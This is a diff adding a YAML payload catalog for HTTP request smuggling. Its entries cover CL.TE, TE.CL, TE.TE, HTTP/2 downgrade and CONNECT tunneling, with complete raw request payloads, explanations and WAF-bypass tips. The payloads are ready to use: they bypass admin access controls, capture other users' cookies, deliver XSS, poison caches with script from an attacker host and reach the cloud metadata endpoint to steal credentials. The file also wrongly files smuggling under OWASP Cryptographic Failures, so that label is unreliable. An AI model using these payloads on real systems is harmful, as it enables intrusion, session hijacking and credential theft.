@@ -1,0 +1,647 @@
+slug: http-smuggling
+name: HTTP Request Smuggling
+owasp: A02:2021 – Cryptographic Failures
+description: 'HTTP request smuggling exploits discrepancies in how front-end and back-end servers parse HTTP request boundaries
+  (Content-Length vs Transfer-Encoding). Attackers can poison the back-end''s request queue, bypass security controls, hijack
+  other users'' requests, and achieve cache poisoning or SSRF escalation.
+
+  '
+severity_range:
+  low: CVSS 6.5 – cache poisoning, request hijacking
+  high: CVSS 9.8 – authentication bypass, SSRF, remote code execution
+references:
+- label: OWASP A02:2021 – Cryptographic Failures (transport layer weaknesses)
+  url: https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
+- label: PortSwigger HTTP Request Smuggling Research
+  url: https://portswigger.net/web-security/request-smuggling
+- label: James Kettle HTTP Desync Attacks
+  url: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+groups:
+- slug: cl-te
+  name: CL.TE Smuggling
+  description: Front-end uses Content-Length, back-end uses Transfer-Encoding
+  difficulty: expert
+  prerequisites:
+  - Front-end proxy uses Content-Length for routing
+  - 'Back-end server prioritizes Transfer-Encoding: chunked'
+  payloads:
+  - id: smuggle-cl-te-001
+    title: Basic CL.TE request smuggling
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 13
+
+      Transfer-Encoding: chunked
+
+
+      0
+
+
+      SMUGGLED
+
+      '
+    how_it_works: 'In CL.TE smuggling, the front-end uses Content-Length to determine the request boundary (13 bytes: "0\r\n\r\nSMUGGLED"),
+      forwarding the entire body to the back-end. The back-end uses Transfer-Encoding and sees the chunk "0" ending the request,
+      then treats "SMUGGLED" as the start of a new request. The next legitimate user request is prepended with "SMUGGLED",
+      potentially hijacking their request or triggering error conditions. This is the foundational CL.TE smuggling technique.
+
+      '
+    prerequisites:
+    - Front-end uses Content-Length
+    - 'Back-end uses Transfer-Encoding: chunked'
+    waf_bypass_notes: 'Obfuscate Transfer-Encoding header: Transfer-Encoding: xchunked or with whitespace'
+    severity_context: CVSS 8.1 – next user request hijacking, security control bypass
+    cve_refs:
+    - CVE-2019-18277
+    tags:
+    - http-smuggling
+    - cl-te
+    - request-hijacking
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-cl-te-002
+    title: CL.TE to bypass front-end access controls
+    payload_string: 'POST /home HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 62
+
+      Transfer-Encoding: chunked
+
+
+      0
+
+
+      GET /admin HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 10
+
+
+      x=
+
+      '
+    how_it_works: 'The front-end proxy checks /home against access control rules and forwards the full body including the
+      smuggled GET /admin request. The back-end splits at the chunked boundary, processing a normal POST /home first, then
+      treating the smuggled content as a new GET /admin request. If the back-end doesn''t enforce access controls independently
+      (relying on the front-end), the /admin endpoint is accessed. This technique bypasses front-end WAF or auth proxy rules.
+
+      '
+    prerequisites:
+    - Front-end enforces access control, back-end does not
+    - CL.TE desync condition present
+    waf_bypass_notes: Security control on path /admin only at front-end; back-end serves it directly
+    severity_context: CVSS 9.8 – access control bypass to internal admin endpoints
+    cve_refs:
+    - CVE-2019-18277
+    tags:
+    - http-smuggling
+    - cl-te
+    - access-control-bypass
+    - admin
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-cl-te-003
+    title: CL.TE to capture other users' requests
+    payload_string: 'POST /post?postId=5 HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 910
+
+      Transfer-Encoding: chunked
+
+
+      0
+
+
+      POST /post?postId=5 HTTP/1.1
+
+      Host: victim.com
+
+      Content-Type: application/x-www-form-urlencoded
+
+      Content-Length: 900
+
+
+      comment=
+
+      '
+    how_it_works: 'This attack captures another user''s full request by smuggling a partial POST with a large Content-Length.
+      The back-end is waiting to complete the smuggled request. When the next victim sends any request, it is appended to
+      the comment body of the smuggled request, which is then stored in the application (e.g., as a comment). The attacker
+      reads the comment to recover the victim''s cookies, tokens, and request details.
+
+      '
+    prerequisites:
+    - Application stores or reflects request body content
+    - CL.TE desync present
+    waf_bypass_notes: Timing and sequence-dependent; requires detecting successful smuggle
+    severity_context: CVSS 9.3 – session token theft from victim users via request capture
+    cve_refs:
+    - CVE-2019-18277
+    tags:
+    - http-smuggling
+    - cl-te
+    - request-capture
+    - session-theft
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-cl-te-004
+    title: CL.TE reflected XSS via smuggled response
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 150
+
+      Transfer-Encoding: chunked
+
+
+      0
+
+
+      GET /xss?x=<img src=1 onerror=alert(1)> HTTP/1.1
+
+      Host: victim.com
+
+      X-Ignore: X
+
+      '
+    how_it_works: 'By smuggling a GET request to a reflective XSS endpoint, the attacker causes the next legitimate user''s
+      response to contain the smuggled XSS response. The victim''s browser receives a response containing the XSS payload
+      from the legitimate victim.com domain, bypassing any XSS filters that would have blocked a direct request. This technique
+      turns a non-exploitable reflected XSS (e.g., blocked by CSP on direct access) into a stored-like XSS via the smuggling
+      desync.
+
+      '
+    prerequisites:
+    - Reflected XSS endpoint exists (even if filtered via direct access)
+    - CL.TE desync present
+    waf_bypass_notes: WAF inspects direct requests; smuggled requests bypass inspection
+    severity_context: CVSS 8.8 – XSS delivered to victim via response desync
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - cl-te
+    - xss
+    - response-desync
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-cl-te-005
+    title: CL.TE Transfer-Encoding header obfuscation
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 6
+
+      Transfer-Encoding: chunked
+
+      Transfer-encoding: cow
+
+
+      0
+
+      '
+    how_it_works: 'HTTP/1.1 allows multiple headers with the same name; behavior varies by implementation. Some front-end
+      servers use the first Transfer-Encoding header (chunked) and pass the request along, while some back-end servers process
+      only the last or the non-standard one (cow, unknown), falling back to Content-Length processing. This obfuscation technique
+      exploits header parsing differences to induce desync. Variations include spaces before the colon, tab characters, and
+      invalid values.
+
+      '
+    prerequisites:
+    - Front-end and back-end parse duplicate/obfuscated Transfer-Encoding differently
+    waf_bypass_notes: Obfuscated TE header bypasses WAFs that only check for 'chunked' value
+    severity_context: CVSS 8.1 – CL.TE desync via TE header obfuscation
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - cl-te
+    - header-obfuscation
+    - bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: te-cl
+  name: TE.CL Smuggling
+  description: Front-end uses Transfer-Encoding, back-end uses Content-Length
+  difficulty: expert
+  prerequisites:
+  - 'Front-end proxy uses Transfer-Encoding: chunked'
+  - Back-end server uses Content-Length
+  payloads:
+  - id: smuggle-te-cl-001
+    title: Basic TE.CL request smuggling
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 4
+
+      Transfer-Encoding: chunked
+
+
+      5c
+
+      GPOST / HTTP/1.1
+
+      Content-Type: application/x-www-form-urlencoded
+
+      Content-Length: 15
+
+
+      x=1
+
+      0
+
+      '
+    how_it_works: 'In TE.CL, the front-end uses Transfer-Encoding to parse the chunked request, forwarding a single large
+      body to the back-end. The back-end uses Content-Length (4) and reads only "5c\r\n" as the body, treating the remainder
+      as a new request starting with GPOST. The smuggled GPOST request is prepended to the next victim''s request at the back-end,
+      causing unexpected routing and potential security control bypass. TE.CL is typically harder to exploit than CL.TE due
+      to chunk size calculation requirements.
+
+      '
+    prerequisites:
+    - 'Front-end processes Transfer-Encoding: chunked'
+    - Back-end uses Content-Length
+    waf_bypass_notes: Include Content-Length header sized for only the initial chunk prefix
+    severity_context: CVSS 8.1 – request queue poisoning, security control bypass
+    cve_refs:
+    - CVE-2019-18277
+    tags:
+    - http-smuggling
+    - te-cl
+    - request-smuggling
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-cl-002
+    title: TE.CL bypass of IP-based access control
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 4
+
+      Transfer-Encoding: chunked
+
+
+      87
+
+      GET /admin/panel HTTP/1.1
+
+      Host: victim.com
+
+      X-Forwarded-For: 127.0.0.1
+
+      Content-Type: application/x-www-form-urlencoded
+
+      Content-Length: 10
+
+
+      x=1
+
+      0
+
+      '
+    how_it_works: 'By smuggling a request with X-Forwarded-For: 127.0.0.1 to an admin endpoint that allows only localhost,
+      the attacker can access IP-restricted resources. The front-end proxy sees a valid chunked request and forwards it; the
+      back-end splits the content and processes the smuggled GET /admin with the spoofed IP header. Since the back-end receives
+      the header in the body of the front-end request, any front-end IP filtering was already bypassed.
+
+      '
+    prerequisites:
+    - Admin panel restricts by IP at back-end only
+    - TE.CL desync present
+    waf_bypass_notes: X-Forwarded-For spoofing combined with request smuggling
+    severity_context: CVSS 9.8 – IP-based access control bypass to admin panel
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - te-cl
+    - ip-bypass
+    - admin
+    - x-forwarded-for
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-cl-003
+    title: TE.CL web cache poisoning
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 4
+
+      Transfer-Encoding: chunked
+
+
+      5e
+
+      GET /static/js/app.js HTTP/1.1
+
+      Host: evil.com
+
+      Content-Type: application/x-www-form-urlencoded
+
+      Content-Length: 10
+
+
+      x=1
+
+      0
+
+      '
+    how_it_works: 'By smuggling a request with a different Host header, the attacker can cause the front-end cache to store
+      a response for /static/js/app.js fetched from evil.com. Subsequent users requesting the same static resource receive
+      the poisoned cached response. If the attacker controls evil.com and serves malicious JavaScript, all users visiting
+      the victim site receive the attacker''s script. This is a persistent, high-impact attack affecting all users.
+
+      '
+    prerequisites:
+    - Front-end caches static resources
+    - TE.CL desync present
+    waf_bypass_notes: Cache poisoning is persistent and affects all users until cache expires
+    severity_context: CVSS 9.3 – stored XSS via cache poisoning through HTTP smuggling
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - te-cl
+    - cache-poisoning
+    - xss
+    - persistent
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-cl-004
+    title: TE.CL to internal SSRF endpoint
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 4
+
+      Transfer-Encoding: chunked
+
+
+      71
+
+      GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
+
+      Host: victim.com
+
+      Content-Type: application/x-www-form-urlencoded
+
+      Content-Length: 10
+
+
+      x=1
+
+      0
+
+      '
+    how_it_works: 'Combining HTTP request smuggling with SSRF, this technique sends a smuggled request to the AWS metadata
+      endpoint (169.254.169.254) via the back-end server''s HTTP client. The back-end processes the smuggled request as if
+      it came from the server itself, enabling access to internal metadata services, cloud credentials, and internal network
+      endpoints that would be blocked for external requests. Because the SSRF payload is embedded in the smuggled body rather
+      than in any direct user-supplied parameter, traditional SSRF input filters on the front-end are completely bypassed,
+      since the front-end proxy never sees the inner request URL. The final attacker outcome is typically cloud credential
+      theft from the metadata service, enabling lateral movement across the cloud account and privilege escalation to any
+      role accessible from the compromised instance.
+
+      '
+    prerequisites:
+    - Back-end can make outbound HTTP requests to internal services
+    - TE.CL desync present
+    waf_bypass_notes: SSRF payload embedded in smuggled request; bypasses SSRF filters on direct input
+    severity_context: CVSS 9.8 – SSRF to cloud metadata via request smuggling, leading to credential theft
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - te-cl
+    - ssrf
+    - cloud-metadata
+    - aws
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-cl-005
+    title: TE.CL via chunked extension obfuscation
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 4
+
+      Transfer-Encoding: chunked
+
+
+      1e;ext=value
+
+      GPOST / HTTP/1.1
+
+      X-Ignore: X
+
+
+      0
+
+      '
+    how_it_works: 'The chunked transfer encoding specification allows chunk extensions (semicolons followed by name=value
+      pairs). Some proxies and servers handle chunk extensions differently—a proxy may strip them and forward clean chunks,
+      while the back-end may not parse extensions at all and use Content-Length instead. By using chunk extensions in the
+      first chunk, the attacker exploits parsing discrepancies between front-end and back-end servers.
+
+      '
+    prerequisites:
+    - Front-end handles chunk extensions, back-end ignores them
+    - TE.CL desync pattern present
+    waf_bypass_notes: Chunk extensions are rarely checked by WAFs; RFC-compliant but implementation-confusing
+    severity_context: CVSS 8.1 – request smuggling via chunk extension parsing discrepancy
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - te-cl
+    - chunk-extension
+    - obfuscation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: te-te
+  name: TE.TE Smuggling
+  description: Both front-end and back-end support Transfer-Encoding but can be desynchronized via obfuscated headers
+  difficulty: expert
+  prerequisites:
+  - Both servers support Transfer-Encoding but handle obfuscated headers differently
+  payloads:
+  - id: smuggle-te-te-001
+    title: TE.TE with obfuscated chunked value
+    payload_string: 'POST / HTTP/1.1
+
+      Host: victim.com
+
+      Transfer-Encoding: chunked
+
+      Transfer-Encoding: identity
+
+
+      5c
+
+      GPOST / HTTP/1.1
+
+      Content-Type: application/x-www-form-urlencoded
+
+      Content-Length: 10
+
+
+      x=1
+
+      0
+
+      '
+    how_it_works: 'In TE.TE desync, both servers support Transfer-Encoding but one of them can be induced to ignore it via
+      obfuscation. By sending two Transfer-Encoding headers (chunked and identity), one server processes the chunked body
+      while the other uses Content-Length or a fallback. The front-end processes chunked and passes a single request body;
+      the back-end processes identity (treating the chunked encoding as literal content) and splits at a different boundary.
+
+      '
+    prerequisites:
+    - Both servers support TE but handle duplicate headers differently
+    waf_bypass_notes: Double TE header may confuse parser; try various obfuscations
+    severity_context: CVSS 8.1 – TE.TE desync enabling request smuggling
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - te-te
+    - obfuscation
+    - duplicate-header
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-te-002
+    title: TE.TE HTTP/2 downgrade smuggling
+    payload_string: 'POST / HTTP/2
+
+      Host: victim.com
+
+      Content-Length: 0
+
+      Transfer-Encoding: chunked
+
+
+      GET /admin HTTP/1.1
+
+      Host: victim.com
+
+      Content-Length: 5
+
+
+      x=1
+
+      '
+    how_it_works: 'When a front-end proxy accepts HTTP/2 and translates to HTTP/1.1 for the back-end, the translation may
+      introduce header injection vulnerabilities. Transfer-Encoding headers in HTTP/2 are illegal per the spec, but some translators
+      pass them through to the HTTP/1.1 back-end, creating a request smuggling condition. The front-end sees a single HTTP/2
+      request; the back-end receives an HTTP/1.1 request with a smuggled second request embedded in the body.
+
+      '
+    prerequisites:
+    - Front-end accepts HTTP/2, back-end uses HTTP/1.1
+    - HTTP/2-to-1.1 translation passes through illegal headers
+    waf_bypass_notes: HTTP/2 downgrade via h2c or ALPN negotiation
+    severity_context: CVSS 9.0 – request smuggling via HTTP/2 to HTTP/1.1 translation
+    cve_refs:
+    - CVE-2021-26690
+    tags:
+    - http-smuggling
+    - te-te
+    - http2
+    - downgrade
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-te-003
+    title: TE.TE using space before header name
+    payload_string: "POST / HTTP/1.1\nHost: victim.com\nTransfer-Encoding: chunked\n Transfer-Encoding: chunked\n\n0\n\nSMUGGLED\n"
+    how_it_works: 'Some HTTP parsers normalize header names by stripping leading whitespace; others treat a header with leading
+      whitespace as a continuation of the previous header value (header folding). By prefixing the second Transfer-Encoding
+      with a space, the front-end may ignore it (treating it as malformed), while the back-end processes it as a valid duplicate
+      header. This creates the TE.TE desync needed for request smuggling.
+
+      '
+    prerequisites:
+    - Front-end ignores space-prefixed headers, back-end processes them
+    waf_bypass_notes: Space prefix on header name is rarely blocked
+    severity_context: CVSS 8.1 – TE.TE desync via header folding/whitespace
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - te-te
+    - header-folding
+    - whitespace
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-te-004
+    title: HTTP/2 request tunneling via extended CONNECT
+    payload_string: 'CONNECT victim.com:443 HTTP/1.1
+
+      Host: victim.com:443
+
+
+      GET /admin HTTP/1.1
+
+      Host: victim.com
+
+      '
+    how_it_works: 'HTTP/2 extended CONNECT (used for WebSocket upgrades via HTTP/2) can be abused for request tunneling if
+      the proxy allows CONNECT to arbitrary hosts. By sending a CONNECT request followed by HTTP/1.1 traffic inside the tunnel,
+      an attacker can bypass WAF inspection on the tunneled traffic. The proxy sees only a CONNECT request and establishes
+      a tunnel; the back-end receives unfiltered HTTP/1.1 requests tunneled inside.
+
+      '
+    prerequisites:
+    - Proxy allows CONNECT tunneling to target hosts
+    - Tunneled traffic not inspected
+    waf_bypass_notes: Traffic inside CONNECT tunnel bypasses application-layer WAF inspection
+    severity_context: CVSS 9.0 – WAF bypass via HTTP CONNECT tunneling
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - connect-tunnel
+    - waf-bypass
+    - http2
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: smuggle-te-te-005
+    title: Smuggling via HTTP/1.0 Keep-Alive persistence
+    payload_string: 'POST / HTTP/1.0
+
+      Host: victim.com
+
+      Content-Length: 50
+
+      Connection: keep-alive
+
+
+      GET /admin HTTP/1.0
+
+      Host: victim.com
+
+      '
+    how_it_works: 'HTTP/1.0 does not support persistent connections by default but supports them via the Connection: keep-alive
+      header. Some front-ends treat HTTP/1.0 requests as single-use (closing the connection after response), while back-ends
+      that reuse connections may treat the body as the beginning of a new request. By embedding a second HTTP request in the
+      body of an HTTP/1.0 request with Connection: keep-alive, the attacker exploits the version negotiation difference between
+      proxy and origin server.
+
+      '
+    prerequisites:
+    - Front-end terminates after HTTP/1.0 response; back-end reuses connection
+    waf_bypass_notes: HTTP/1.0 requests may receive less scrutiny than HTTP/1.1
+    severity_context: CVSS 7.5 – request smuggling via HTTP version mismatch
+    cve_refs: []
+    tags:
+    - http-smuggling
+    - http10
+    - keep-alive
+    - version-mismatch
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
